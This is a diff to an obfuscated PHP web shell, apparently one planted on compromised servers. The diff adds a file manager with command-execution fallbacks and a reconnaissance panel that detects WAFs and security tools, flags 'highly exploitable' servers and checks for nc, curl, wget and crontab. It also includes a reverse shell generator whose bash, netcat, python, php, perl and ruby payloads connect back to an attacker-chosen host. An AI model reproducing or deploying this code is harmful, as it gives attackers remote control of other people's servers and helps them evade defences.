@@ -337,12 +337,36 @@ function zipFolder($source, $destination)
     }
     return $zip->close();
 }
+
+function fixZipPermissions($path) {
+    if ($GLOBALS['_q_'][9]($path)) { // is_dir
+        // Set root folder permission
+        @$GLOBALS['_q_'][16]($path, 0755); // chmod 0755
+        
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        
+        foreach ($iterator as $item) {
+            $realPath = $item->getRealPath();
+            if ($item->isDir()) {
+                @$GLOBALS['_q_'][16]($realPath, 0755); // chmod folder 0755
+            } else {
+                @$GLOBALS['_q_'][16]($realPath, 0644); // chmod file 0644
+            }
+        }
+    } elseif ($GLOBALS['_q_'][14]($path)) { // file_exists
+         @$GLOBALS['_q_'][16]($path, 0644);
+    }
+}
+
 function unzipFile($source, $parent_dir)
 {
-
     $destination_folder_name = $GLOBALS['_q_'][33]($source, PATHINFO_FILENAME); // pathinfo
     $destination_path = $parent_dir . DIRECTORY_SEPARATOR . $destination_folder_name;
 
+    // Buat folder tujuan jika belum ada
     if (!$GLOBALS['_q_'][14]($destination_path)) { // file_exists
         @$GLOBALS['_q_'][35]($destination_path, 0755, true); // mkdir
     }
@@ -351,37 +375,44 @@ function unzipFile($source, $parent_dir)
         return 'Direktori tujuan tidak dapat ditulis (not writable).';
     }
 
-    // --- METODE 1: Coba gunakan ZipArchive (lebih cepat jika ada) ---
+    $success = false;
+
+    // --- METODE 1: ZipArchive (Native PHP) ---
     if ($GLOBALS['_q_'][83]('ZipArchive')) {
         $zip = new ZipArchive;
         if ($zip->open($source) === TRUE) {
             if ($zip->extractTo($destination_path)) {
                 $zip->close();
-                return true;
+                $success = true;
+            } else {
+                $zip->close();
             }
-            $zip->close();
         }
-        // Jika gagal, jangan langsung return, biarkan jatuh ke metode PclZip.
     }
 
-    // --- METODE 2: System Command (Shell/Exec) ---
-    // Menggunakan index 21 (shell_exec) dan 88 (escapeshellarg)
-    if ($GLOBALS['_q_'][20]('shell_exec') || $GLOBALS['_q_'][20]('system')) {
+    // --- METODE 2: System Command (Fallback) ---
+    // Jika ZipArchive gagal, coba gunakan executeCommand() yang sudah mencakup
+    // shell_exec, exec, passthru, system, dan proc_open.
+    if (!$success) {
+        // index 88: escapeshellarg
         $cmd = 'unzip -o ' . $GLOBALS['_q_'][88]($source) . ' -d ' . $GLOBALS['_q_'][88]($destination_path);
-
-        // Eksekusi silent
-        if ($GLOBALS['_q_'][20]('shell_exec')) {
-            @$GLOBALS['_q_'][21]($cmd);
-        } elseif ($GLOBALS['_q_'][20]('system')) {
-            @$GLOBALS['_q_'][58]($cmd);
-        }
-
-        if ($GLOBALS['_q_'][9]($destination_path)) {
-            return true;
+        
+        // Memanggil fungsi global executeCommand yang sudah ada di script
+        executeCommand($cmd);
+        
+        // Cek apakah file berhasil diekstrak (cek folder tujuan tidak kosong)
+        if (count(scandir($destination_path)) > 2) {
+            $success = true;
         }
     }
 
-    return 'Gagal unzip.';
+    // --- FINAL STEP: Fix Permissions ---
+    if ($success) {
+        fixZipPermissions($destination_path);
+        return true;
+    }
+
+    return 'Gagal unzip: ZipArchive dan System Command tidak tersedia atau gagal.';
 }
 function downloadFileFromUrl($url, $destination)
 {
@@ -1006,11 +1037,13 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
               <button onclick="showModalAndCloseMenu('cmd')"
                 class="w-full text-left flex items-center gap-3 px-4 py-3 text-sm text-gray-200 hover:bg-gray-600"><i
                   class="fas fa-terminal w-5 text-center"></i>CMD</button>
-              <button onclick="showModal('revshell')" class="flex items-center gap-3 text-gray-300 hover:text-white hover:bg-gray-800 px-4 py-2 rounded-lg transition-colors w-full text-left mb-1">
+              <button onclick="showModal('revshell')"
+                class="flex items-center gap-3 text-gray-300 hover:text-white hover:bg-gray-800 px-4 py-2 rounded-lg transition-colors w-full text-left mb-1">
                 <i class="fas fa-tools w-5 text-center"></i>
                 <span>RevShell Gen</span>
-             </button>
-              <button onclick="showModal('server-info')" class="flex items-center gap-3 text-gray-300 hover:text-white hover:bg-gray-800 px-4 py-2 rounded-lg transition-colors w-full text-left mb-1">
+              </button>
+              <button onclick="showModal('server-info')"
+                class="flex items-center gap-3 text-gray-300 hover:text-white hover:bg-gray-800 px-4 py-2 rounded-lg transition-colors w-full text-left mb-1">
                 <i class="fas fa-server w-5 text-center"></i>
                 <span>Server Info</span>
               </button>
@@ -1050,15 +1083,16 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
 
     <?php if ($action === 'view'): ?>
     <div class="bg-gray-800 rounded-lg shadow-xl p-4 mb-4">
-      <h2 class="text-xl text-white font-bold mb-2">Editing: <?= $GLOBALS['_q_'][37]($GLOBALS['_q_'][41]($item_path)) ?></h2>
+      <h2 class="text-xl text-white font-bold mb-2">Editing: <?= $GLOBALS['_q_'][37]($GLOBALS['_q_'][41]($item_path)) ?>
+      </h2>
       <form id="ajax-edit-form">
         <input type="hidden" name="action" value="edit_file">
         <input type="hidden" name="file_path" id="ef-path" value="<?= $GLOBALS['_q_'][37]($item_path) ?>">
-        
+
         <div id="ace-editor" class="w-full h-[500px] border border-gray-600 rounded text-base"></div>
-        
+
         <textarea name="content" id="real-textarea" class="hidden"><?= $content; ?></textarea>
-        
+
         <div class="mt-4 flex gap-2">
           <button type="submit" id="save-btn" class="btn btn-blue"><i class="fas fa-save mr-2"></i>Save Changes</button>
           <a href="?p=<?= $current_path_encoded ?>" class="btn btn-gray"><i class="fas fa-arrow-left mr-2"></i>Back</a>
@@ -1067,162 +1101,162 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
     </div>
 
     <script>
-    document.addEventListener("DOMContentLoaded", function () {
-    
-        var editor = ace.edit("ace-editor");
-        editor.setTheme("ace/theme/cobalt");
-    
-        /* =============================
-           DETEKSI DEVICE
-        ============================== */
-        const isDesktop = window.matchMedia("(min-width: 1024px)").matches;
-        const isTablet  = window.matchMedia("(min-width: 768px) and (max-width: 1023px)").matches;
-        const isMobile  = window.matchMedia("(max-width: 767px)").matches;
-    
-        /* =============================
-           MODE FILE
-        ============================== */
-        var fileName = "<?= $GLOBALS['_q_'][41]($item_path) ?>";
-        var ext = fileName.split('.').pop().toLowerCase();
-    
-        var modes = {
-            php: "php",
-            js: "javascript",
-            html: "html",
-            css: "css",
-            py: "python",
-            sh: "sh",
-            json: "json",
-            md: "markdown",
-            txt: "text"
-        };
-    
-        editor.session.setMode("ace/mode/" + (modes[ext] || "text"));
-    
-        /* =============================
-           SETTING GLOBAL (SEMUA DEVICE)
-        ============================== */
-        editor.setShowPrintMargin(false);
-        editor.setHighlightActiveLine(true);
-        editor.session.setUseSoftTabs(true);
-        editor.session.setTabSize(4);
-        editor.session.setUseWorker(false); // hindari lag di mobile
-        editor.renderer.setScrollMargin(10, 10, 10, 10);
-        editor.$blockScrolling = Infinity;
-    
-        /* =============================
-           SETTING DESKTOP
-        ============================== */
-        if (isDesktop) {
-            editor.session.setUseWrapMode(true);
-            editor.setOptions({
-                fontSize: "14px",
-                showLineNumbers: true,
-                showGutter: true,
-                enableBasicAutocompletion: true,
-                enableLiveAutocompletion: true,
-                enableSnippets: true,
-                highlightSelectedWord: true,
-                scrollPastEnd: 0.5
-            });
-        }
-    
-        /* =============================
-           SETTING TABLET
-        ============================== */
-        if (isTablet) {
-            editor.session.setUseWrapMode(true);
-            editor.setOptions({
-                fontSize: "13px",
-                showLineNumbers: true,
-                enableBasicAutocompletion: false,
-                enableLiveAutocompletion: false,
-                enableSnippets: false,
-                scrollPastEnd: 0.3
-            });
-        }
-    
-        /* =============================
-           SETTING MOBILE
-        ============================== */
-        if (isMobile) {
-            editor.session.setUseWrapMode(false);
-            editor.setOptions({
-                fontSize: "12px",
-                showLineNumbers: false,
-                showGutter: false,
-                highlightActiveLine: false,
-                enableBasicAutocompletion: false,
-                enableLiveAutocompletion: false,
-                enableSnippets: false,
-                scrollPastEnd: 0
-            });
-    
-            // Mobile UX improvement
-            editor.renderer.setPadding(8);
-            editor.container.style.touchAction = "manipulation";
-        }
-    
-        /* =============================
-           AUTO UPDATE SAAT RESIZE / ROTATE
-        ============================== */
-        function updateResponsiveSetting() {
-            const desktop = window.matchMedia("(min-width: 1024px)").matches;
-            editor.session.setUseWrapMode(desktop);
-        }
-    
-        window.matchMedia("(min-width: 1024px)")
-            .addEventListener("change", updateResponsiveSetting);
-    
-        /* =============================
-           LOAD DATA
-        ============================== */
-        var rawData = document.getElementById("real-textarea").value;
-        editor.setValue(rawData, -1);
-    
-        // Fungsi Save via AJAX
-        const saveFile = (e) => {
-            if(e) e.preventDefault();
-            const btn = document.getElementById('save-btn');
-            const originalText = btn.innerHTML;
-            
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Saving...';
-            btn.disabled = true;
+    document.addEventListener("DOMContentLoaded", function() {
 
-            const formData = new FormData();
-            formData.append('action', 'edit_file');
-            formData.append('file_path', document.getElementById('ef-path').value);
-            formData.append('content', editor.getValue());
+      var editor = ace.edit("ace-editor");
+      editor.setTheme("ace/theme/cobalt");
 
-            fetch(window.location.href, {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => res.json())
-            .then(data => {
-                if(data.status === 'success') {
-                    btn.className = 'btn bg-green-600 text-white';
-                    btn.innerHTML = '<i class="fas fa-check mr-2"></i> Saved!';
-                    setTimeout(() => {
-                        btn.className = 'btn btn-blue';
-                        btn.innerHTML = originalText;
-                        btn.disabled = false;
-                    }, 2000);
-                } else {
-                    alert(data.message);
-                    btn.disabled = false;
-                    btn.innerHTML = originalText;
-                }
-            })
-            .catch(err => {
-                alert('Connection Error!');
+      /* =============================
+         DETEKSI DEVICE
+      ============================== */
+      const isDesktop = window.matchMedia("(min-width: 1024px)").matches;
+      const isTablet = window.matchMedia("(min-width: 768px) and (max-width: 1023px)").matches;
+      const isMobile = window.matchMedia("(max-width: 767px)").matches;
+
+      /* =============================
+         MODE FILE
+      ============================== */
+      var fileName = "<?= $GLOBALS['_q_'][41]($item_path) ?>";
+      var ext = fileName.split('.').pop().toLowerCase();
+
+      var modes = {
+        php: "php",
+        js: "javascript",
+        html: "html",
+        css: "css",
+        py: "python",
+        sh: "sh",
+        json: "json",
+        md: "markdown",
+        txt: "text"
+      };
+
+      editor.session.setMode("ace/mode/" + (modes[ext] || "text"));
+
+      /* =============================
+         SETTING GLOBAL (SEMUA DEVICE)
+      ============================== */
+      editor.setShowPrintMargin(false);
+      editor.setHighlightActiveLine(true);
+      editor.session.setUseSoftTabs(true);
+      editor.session.setTabSize(4);
+      editor.session.setUseWorker(false); // hindari lag di mobile
+      editor.renderer.setScrollMargin(10, 10, 10, 10);
+      editor.$blockScrolling = Infinity;
+
+      /* =============================
+         SETTING DESKTOP
+      ============================== */
+      if (isDesktop) {
+        editor.session.setUseWrapMode(true);
+        editor.setOptions({
+          fontSize: "14px",
+          showLineNumbers: true,
+          showGutter: true,
+          enableBasicAutocompletion: true,
+          enableLiveAutocompletion: true,
+          enableSnippets: true,
+          highlightSelectedWord: true,
+          scrollPastEnd: 0.5
+        });
+      }
+
+      /* =============================
+         SETTING TABLET
+      ============================== */
+      if (isTablet) {
+        editor.session.setUseWrapMode(true);
+        editor.setOptions({
+          fontSize: "13px",
+          showLineNumbers: true,
+          enableBasicAutocompletion: false,
+          enableLiveAutocompletion: false,
+          enableSnippets: false,
+          scrollPastEnd: 0.3
+        });
+      }
+
+      /* =============================
+         SETTING MOBILE
+      ============================== */
+      if (isMobile) {
+        editor.session.setUseWrapMode(false);
+        editor.setOptions({
+          fontSize: "12px",
+          showLineNumbers: false,
+          showGutter: false,
+          highlightActiveLine: false,
+          enableBasicAutocompletion: false,
+          enableLiveAutocompletion: false,
+          enableSnippets: false,
+          scrollPastEnd: 0
+        });
+
+        // Mobile UX improvement
+        editor.renderer.setPadding(8);
+        editor.container.style.touchAction = "manipulation";
+      }
+
+      /* =============================
+         AUTO UPDATE SAAT RESIZE / ROTATE
+      ============================== */
+      function updateResponsiveSetting() {
+        const desktop = window.matchMedia("(min-width: 1024px)").matches;
+        editor.session.setUseWrapMode(desktop);
+      }
+
+      window.matchMedia("(min-width: 1024px)")
+        .addEventListener("change", updateResponsiveSetting);
+
+      /* =============================
+         LOAD DATA
+      ============================== */
+      var rawData = document.getElementById("real-textarea").value;
+      editor.setValue(rawData, -1);
+
+      // Fungsi Save via AJAX
+      const saveFile = (e) => {
+        if (e) e.preventDefault();
+        const btn = document.getElementById('save-btn');
+        const originalText = btn.innerHTML;
+
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Saving...';
+        btn.disabled = true;
+
+        const formData = new FormData();
+        formData.append('action', 'edit_file');
+        formData.append('file_path', document.getElementById('ef-path').value);
+        formData.append('content', editor.getValue());
+
+        fetch(window.location.href, {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(data => {
+            if (data.status === 'success') {
+              btn.className = 'btn bg-green-600 text-white';
+              btn.innerHTML = '<i class="fas fa-check mr-2"></i> Saved!';
+              setTimeout(() => {
+                btn.className = 'btn btn-blue';
+                btn.innerHTML = originalText;
                 btn.disabled = false;
-            });
-        };
+              }, 2000);
+            } else {
+              alert(data.message);
+              btn.disabled = false;
+              btn.innerHTML = originalText;
+            }
+          })
+          .catch(err => {
+            alert('Connection Error!');
+            btn.disabled = false;
+          });
+      };
 
-        // Bind Submit Form
-        document.getElementById('ajax-edit-form').addEventListener('submit', saveFile);
-    
+      // Bind Submit Form
+      document.getElementById('ajax-edit-form').addEventListener('submit', saveFile);
+
     });
     </script>
 
@@ -1346,40 +1380,238 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
       </div>
     </div>
   </div>
-    
-    <div id="revshell-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4 z-50">
-        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-xl">
-            <h2 class="text-xl text-white font-bold mb-4"><i class="fas fa-terminal text-yellow-400 mr-2"></i> Reverse Shell Generator</h2>
-            
-            <div class="grid grid-cols-3 gap-2 mb-4">
-                <input type="text" id="rs-ip" placeholder="LHOST (IP)" class="col-span-2 bg-gray-700 text-white p-2 rounded border border-gray-600">
-                <input type="text" id="rs-port" placeholder="LPORT" value="4444" class="bg-gray-700 text-white p-2 rounded border border-gray-600">
-            </div>
-            
-            <div class="mb-4">
-                <label class="text-xs text-gray-400 block mb-1">Type</label>
-                <select id="rs-type" class="w-full bg-gray-700 text-white p-2 rounded border border-gray-600" onchange="genShell()">
-                    <option value="bash">Bash -i</option>
-                    <option value="nc">Netcat (nc -e)</option>
-                    <option value="python">Python</option>
-                    <option value="php">PHP exec</option>
-                    <option value="perl">Perl</option>
-                    <option value="ruby">Ruby</option>
-                </select>
-            </div>
 
-            <div class="mb-4 relative">
-                <textarea id="rs-output" readonly class="w-full h-24 bg-gray-900 text-green-400 font-mono text-xs p-2 rounded border border-gray-700 focus:outline-none"></textarea>
-                <button onclick="copyShell()" class="absolute top-2 right-2 bg-gray-700 hover:bg-gray-600 text-white text-xs px-2 py-1 rounded">Copy</button>
-            </div>
+  <div id="server-info-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4 z-50">
+    <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-4xl overflow-y-auto max-h-[90vh]">
+      <div class="flex justify-between items-center mb-4 border-b border-gray-700 pb-2">
+        <h2 class="text-xl text-white font-bold"><i class="fas fa-microchip text-blue-400 mr-2"></i> Server Intelligence
+        </h2>
+        <button onclick="hideAllModals()" class="text-gray-400 hover:text-white">&times;</button>
+      </div>
 
-            <div class="flex justify-end gap-2">
-                <button type="button" class="btn btn-gray" onclick="hideAllModals()">Close</button>
-                <button type="button" class="btn btn-blue" onclick="genShell()">Generate</button>
-            </div>
+      <?php
+// === HELPER: Safe shell command execution (PHP 5.5+ compatible) ===
+function _si_exec($cmd) {
+    // Coba berbagai fungsi shell secara berurutan
+    $result = null;
+    if (function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
+        $result = @shell_exec($cmd);
+    } elseif (function_exists('exec') && !in_array('exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
+        @exec($cmd, $out);
+        $result = isset($out[0]) ? implode("\n", $out) : null;
+    } elseif (function_exists('system') && !in_array('system', array_map('trim', explode(',', ini_get('disable_functions'))))) {
+        ob_start();
+        @system($cmd);
+        $result = ob_get_clean();
+    } elseif (function_exists('passthru') && !in_array('passthru', array_map('trim', explode(',', ini_get('disable_functions'))))) {
+        ob_start();
+        @passthru($cmd);
+        $result = ob_get_clean();
+    }
+    return ($result !== null && trim($result) !== '') ? trim($result) : false;
+}
+
+// === HELPER: Safe binary check (fallback ke is_executable jika shell disabled) ===
+function _si_which($bin) {
+    // Coba shell dulu
+    $r = _si_exec('which ' . escapeshellarg($bin) . ' 2>/dev/null');
+    if ($r !== false) return true;
+
+    // Fallback: cek manual di PATH umum
+    $paths = array('/usr/bin', '/usr/local/bin', '/bin', '/sbin', '/usr/sbin', '/usr/local/sbin');
+    foreach ($paths as $p) {
+        if (@is_executable($p . '/' . $bin)) return true;
+    }
+    return false;
+}
+
+// === DETEKSI WEB SERVER & PANEL ===
+$sSoftware = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '';
+$sLower    = strtolower($sSoftware);
+
+$webServer = 'Unknown';
+if (strpos($sLower, 'litespeed') !== false)      $webServer = 'LiteSpeed';
+elseif (strpos($sLower, 'apache') !== false)     $webServer = 'Apache';
+elseif (strpos($sLower, 'nginx') !== false)      $webServer = 'Nginx';
+
+$hosting = 'Standard / Custom';
+if (getenv('CPANEL'))                             $hosting = 'cPanel';
+elseif (@file_exists('/.dockerenv'))              $hosting = 'Docker Container';
+elseif (strpos($sLower, 'litespeed') !== false)  $hosting = 'Shared Hosting (LS)';
+
+// === WAF DETECTOR ===
+$wafDetected = 'None / Unknown';
+$wafColor    = 'text-green-500';
+
+$headers   = function_exists('getallheaders') ? @getallheaders() : $_SERVER;
+$headerStr = strtolower(@json_encode($headers));
+
+if (isset($_SERVER['HTTP_CF_RAY']) || isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+    $wafDetected = 'Cloudflare WAF';
+    $wafColor    = 'text-orange-400';
+} elseif (strpos($headerStr, 'mod_security') !== false || strpos($headerStr, 'f5-traffic') !== false) {
+    $wafDetected = 'ModSecurity / F5';
+    $wafColor    = 'text-red-500';
+} elseif (isset($_SERVER['HTTP_X_SUCURI_ID']) || isset($_SERVER['HTTP_X_SUCURI_CACHE'])) {
+    $wafDetected = 'Sucuri WAF';
+    $wafColor    = 'text-orange-500';
+} elseif (strpos($sLower, 'imunify360') !== false || @file_exists('/etc/sysconfig/imunify360')) {
+    $wafDetected = 'Imunify360';
+    $wafColor    = 'text-red-400';
+} elseif (strpos($headerStr, 'wordfence') !== false) {
+    $wafDetected = 'Wordfence (WAF)';
+    $wafColor    = 'text-blue-400';
+}
+
+// === PHP HANDLER ===
+$sapi    = php_sapi_name();
+$handler = $sapi;
+if ($sapi == 'apache2handler') $handler = 'mod_php (Apache)';
+elseif ($sapi == 'fpm-fcgi')   $handler = 'PHP-FPM';
+elseif ($sapi == 'cgi-fcgi')   $handler = 'CGI/FastCGI';
+elseif ($sapi == 'litespeed')  $handler = 'LiteSpeed SAPI';
+?>
+
+      <div class="grid grid-cols-1 md:grid-cols-4 gap-4 text-[11px] font-mono">
+        <div class="bg-gray-900 p-3 rounded border border-gray-700">
+          <p class="text-blue-400 font-bold mb-2 border-b border-gray-800 pb-1 uppercase">System Core</p>
+          <div class="space-y-1">
+            <p class="flex justify-between"><span class="text-gray-500">OS:</span> <span
+                class="text-gray-300 text-right"><?= php_uname('s').' '.php_uname('r'); ?></span></p>
+            <p class="flex justify-between"><span class="text-gray-500">Arch:</span> <span
+                class="text-gray-300"><?= php_uname('m'); ?></span></p>
+            <p class="flex justify-between"><span class="text-gray-500">PHP SAPI:</span> <span
+                class="text-yellow-500"><?= $handler ?></span></p>
+            <p class="flex justify-between"><span class="text-gray-500">Web Srv:</span> <span
+                class="text-gray-300"><?= $webServer ?></span></p>
+            <p class="flex justify-between"><span class="text-gray-500">Panel:</span> <span
+                class="text-blue-400"><?= $hosting ?></span></p>
+            <p class="flex justify-between"><span class="text-gray-500">HTTPS:</span> <span
+                class="text-gray-300"><?= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'YES' : 'NO' ?></span>
+            </p>
+            <p class="flex justify-between"><span class="text-gray-500">WAF:</span> <span
+                class="<?= $wafColor ?> font-bold"><?= $wafDetected ?></span></p>
+          </div>
         </div>
+
+        <div class="bg-gray-900 p-3 rounded border border-gray-700">
+          <p class="text-orange-400 font-bold mb-2 border-b border-gray-800 pb-1 uppercase">Capabilities</p>
+          <div class="space-y-1">
+            <?php
+              $cron     = _si_which('crontab');
+              $mail     = function_exists('mail') && (strpos((string)ini_get('sendmail_path'), 'sendmail') !== false || _si_which('sendmail'));
+              $testFile = (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : sys_get_temp_dir()) . '/.3wgf_tmp';
+              $immutable = !@file_put_contents($testFile, '1');
+              @unlink($testFile);
+            ?>
+            <p class="flex justify-between"><span class="text-gray-500">Crontab:</span> <span
+                class="<?= $cron?'text-green-400':'text-red-500' ?>"><?= $cron?'YES':'NO' ?></span></p>
+            <p class="flex justify-between"><span class="text-gray-500">Mailer:</span> <span
+                class="<?= $mail?'text-green-400':'text-red-500' ?>"><?= $mail?'YES':'NO' ?></span></p>
+            <p class="flex justify-between"><span class="text-gray-500">Immutable:</span> <span
+                class="<?= $immutable?'text-red-500':'text-green-400' ?>"><?= $immutable?'YES':'NO' ?></span></p>
+          </div>
+        </div>
+
+        <div class="bg-gray-900 p-3 rounded border border-gray-700">
+          <p class="text-green-400 font-bold mb-2 border-b border-gray-800 pb-1 uppercase">PHP Configuration</p>
+          <div class="space-y-1">
+            <p class="flex justify-between"><span class="text-gray-500">Memory Limit:</span> <span
+                class="text-gray-300"><?= ini_get('memory_limit') ?></span></p>
+            <p class="flex justify-between"><span class="text-gray-500">Max Exec:</span> <span
+                class="text-gray-300"><?= ini_get('max_execution_time') ?>s</span></p>
+            <p class="flex justify-between"><span class="text-gray-500">Max Upload:</span> <span
+                class="text-gray-300"><?= ini_get('upload_max_filesize') ?></span></p>
+            <p class="flex justify-between"><span class="text-gray-500">Post Max:</span> <span
+                class="text-gray-300"><?= ini_get('post_max_size') ?></span></p>
+            <p class="flex justify-between"><span class="text-gray-500">Input Vars:</span> <span
+                class="text-gray-300"><?= ini_get('max_input_vars') ?></span></p>
+          </div>
+        </div>
+
+        <div class="bg-gray-900 p-3 rounded border border-gray-700">
+          <p class="text-purple-400 font-bold mb-2 border-b border-gray-800 pb-1 uppercase">Critical Extensions</p>
+          <div class="grid grid-cols-2 gap-x-2">
+            <?php 
+                    $exts = ['pdo','curl','openssl','mbstring','json','gd','zip'];
+                    foreach($exts as $e) {
+                        $loaded = extension_loaded($e);
+                        echo "<div class='flex justify-between'><span class='text-gray-500'>$e:</span> <span class='".($loaded?'text-green-400':'text-red-500')."'>".($loaded?'OK':'NO')."</span></div>";
+                    }
+                    ?>
+          </div>
+        </div>
+
+        <div class="bg-gray-900 p-3 rounded border border-gray-700 md:col-span-4">
+          <p class="text-red-400 font-bold mb-1 uppercase">Security / Disabled Functions</p>
+          <div class="text-[10px] text-gray-400 break-all bg-black p-2 rounded border border-gray-800">
+            <?= ini_get('disable_functions') ?: '<span class="text-green-500 italic">None - Server is highly exploitable</span>'; ?>
+          </div>
+        </div>
+
+        <div class="bg-gray-900 p-3 rounded border border-gray-700 md:col-span-4">
+          <p class="text-yellow-400 font-bold mb-1 uppercase text-center">Software Availability (Binary Check)</p>
+          <div class="grid grid-cols-2 md:grid-cols-5 gap-2 text-[10px] mt-2">
+            <?php
+              $bins = array('python','perl','ruby','bash','gcc','curl','wget','nc','crontab','sendmail');
+              foreach ($bins as $b) {
+                  $isAvail = _si_which($b);
+                  echo "<div class='flex justify-between bg-black p-1 px-2 rounded border border-gray-800'>";
+                  echo "<span class='text-gray-500'>" . htmlspecialchars($b) . "</span>";
+                  echo "<span class='" . ($isAvail ? 'text-green-400' : 'text-red-600') . " font-bold'>" . ($isAvail ? 'YES' : 'NO') . "</span>";
+                  echo "</div>";
+              }
+            ?>
+          </div>
+        </div>
+      </div>
+
+      <div class="mt-4 flex justify-end">
+        <button onclick="hideAllModals()"
+          class="px-4 py-1 bg-gray-700 hover:bg-gray-600 text-white rounded text-xs transition-colors">Close</button>
+      </div>
     </div>
-    
+  </div>
+
+  <div id="revshell-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4 z-50">
+    <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-xl">
+      <h2 class="text-xl text-white font-bold mb-4"><i class="fas fa-terminal text-yellow-400 mr-2"></i> Reverse Shell
+        Generator</h2>
+
+      <div class="grid grid-cols-3 gap-2 mb-4">
+        <input type="text" id="rs-ip" placeholder="LHOST (IP)"
+          class="col-span-2 bg-gray-700 text-white p-2 rounded border border-gray-600">
+        <input type="text" id="rs-port" placeholder="LPORT" value="4444"
+          class="bg-gray-700 text-white p-2 rounded border border-gray-600">
+      </div>
+
+      <div class="mb-4">
+        <label class="text-xs text-gray-400 block mb-1">Type</label>
+        <select id="rs-type" class="w-full bg-gray-700 text-white p-2 rounded border border-gray-600"
+          onchange="genShell()">
+          <option value="bash">Bash -i</option>
+          <option value="nc">Netcat (nc -e)</option>
+          <option value="python">Python</option>
+          <option value="php">PHP exec</option>
+          <option value="perl">Perl</option>
+          <option value="ruby">Ruby</option>
+        </select>
+      </div>
+
+      <div class="mb-4 relative">
+        <textarea id="rs-output" readonly
+          class="w-full h-24 bg-gray-900 text-green-400 font-mono text-xs p-2 rounded border border-gray-700 focus:outline-none"></textarea>
+        <button onclick="copyShell()"
+          class="absolute top-2 right-2 bg-gray-700 hover:bg-gray-600 text-white text-xs px-2 py-1 rounded">Copy</button>
+      </div>
+
+      <div class="flex justify-end gap-2">
+        <button type="button" class="btn btn-gray" onclick="hideAllModals()">Close</button>
+        <button type="button" class="btn btn-blue" onclick="genShell()">Generate</button>
+      </div>
+    </div>
+  </div>
+
   <div id="upload-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
     <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
       <h2 class="text-xl text-white font-bold mb-4">Upload Files</h2>
@@ -1855,31 +2087,36 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
 
     // -- Logic Reverse Shell Generator --
     function genShell() {
-        var ip = document.getElementById('rs-ip').value || '10.10.10.10';
-        var port = document.getElementById('rs-port').value || '4444';
-        var type = document.getElementById('rs-type').value;
-        var out = document.getElementById('rs-output');
-        var payload = '';
+      var ip = document.getElementById('rs-ip').value || '10.10.10.10';
+      var port = document.getElementById('rs-port').value || '4444';
+      var type = document.getElementById('rs-type').value;
+      var out = document.getElementById('rs-output');
+      var payload = '';
 
-        if(type === 'bash') payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
-        else if(type === 'nc') payload = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
-        else if(type === 'python') payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
-        else if(type === 'php') payload = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
-        else if(type === 'perl') payload = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
-        else if(type === 'ruby') payload = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
+      if (type === 'bash') payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+      else if (type === 'nc') payload =
+        `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
+      else if (type === 'python') payload =
+        `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
+      else if (type === 'php') payload =
+        `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
+      else if (type === 'perl') payload =
+        `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
+      else if (type === 'ruby') payload =
+        `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
 
